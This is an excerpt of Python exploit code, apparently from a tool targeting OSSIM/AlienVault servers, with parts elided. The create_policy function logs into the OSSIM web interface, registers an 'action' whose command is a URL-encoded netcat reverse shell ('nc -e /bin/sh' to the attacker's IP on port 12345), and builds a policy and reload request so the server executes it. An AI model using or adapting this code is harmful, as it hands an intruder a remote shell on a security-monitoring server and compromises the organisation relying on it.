...
def create_policy(ossimip, ossimport):
	authurl = globals.https + ossimip + ":" + str(
		ossimport) + "/ossim/session/login.php"
	actionurl = globals.https + ossimip + ":" + str(
		ossimport) + "/ossim/action/modifyactions.php"
	getactionurl = globals.https + ossimip + ":" + str(
		ossimport) + "/ossim/action/getaction.php"
	getctxurl = globals.https + ossimip + ":" + str(
		ossimport) + "/ossim/policy/policy.php?m_opt=configuration&sm_opt=threat_intelligence"
	policyurl = globals.https + ossimip + ":" + str(
		ossimport) + "/ossim/policy/newpolicy.php"
	reloadurl = globals.https + ossimip + ":" + str(
		ossimport) + "/ossim/conf/reload.php?what=policies&back=..%2Fpolicy%2Fpolicy.php"
	...
	netcatcommand = "nc+-e+%2Fbin%2Fsh+" + local_ip + "+12345"
	paramsaction = \
		"id=&action=new&old_name=&action_name=testossim&old_descr=&descr=testossim" \
	...
	try:
		...
		if action.status_code == 200 and "Action successfully updated" in action.text:
			...
			mess = [actionid, ctxfinal]
		else:
			globals.ossim_messages(3)
			mess = []

		if actionid != '' and ctxfinal != '':
			globals.ossim_messages(2, mess)

			paramspolicy = \
				"descr=testossim&active=1&group=00000000000000000000000000000000&ctx=" \
				+ ctxfinal + \
